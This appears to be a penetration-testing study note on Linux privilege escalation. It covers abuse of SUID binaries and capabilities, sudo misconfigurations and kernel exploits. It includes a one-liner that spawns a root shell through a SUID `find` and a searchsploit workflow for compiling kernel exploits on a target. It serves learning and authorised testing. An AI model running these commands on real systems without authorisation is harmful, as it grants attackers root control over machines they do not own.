## Abusing Setuid Binaries and Capabilities

*Real UID/GID*: When a user or a system-automated script launches a process, it inherits the UID/GID of its initiating script

*Effective UID/GID*: The actual value being checked when performing sensitive operations

E.g.
```
joe@debian-privesc:~$ ls -asl /usr/bin/passwd 
64 -rwsr-xr-x 1 root root 63736 Jul 27 2018 /usr/bin/passwd
```
- The `s` SUID bit is set

See [[Enumerating Linux]] for how to locate SUID binaries in Linux

E.g. if the `find` utility is misconfigured with the SUID bit set:
`find /home/joe/Desktop -exec "/usr/bin/bash" -p \;`

Enumerate for binaries with capabilities:
`/usr/sbin/getcap -r / 2>/dev/null`
- look for `cap_setuid+ep`

After finding binaries with capability misconfigs, search it on [GTFOBins](https://gtfobins.github.io/) for how to misuse

## Abusing Sudo

sudo-related permissions are in **/etc/sudoers** file

List allowed sudo commands for current user:
`sudo -l`

Search on [GTFOBins](https://gtfobins.github.io/)

If it doesn't work, check `cat /var/log/syslog | grep [name-of-command]`

## Exploiting Kernel Vulnerabilities

Depends on target's kernel version and operating system flavour (e.g. Debian, RHEL, Gentoo, etc.)

Enumeration:
- `cat /etc/issue` (system identification)
- `uname -r` (kernel version)
- `arch` (system architecture)

Search for exploits using searchsploit:
`searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"`

Compile exploit (make sure to `head` it to check for any compilation instructions)
- better compile on target machine if possible (e.g. target has the compiler installed already) to avoid cross-compilation compatibility issues

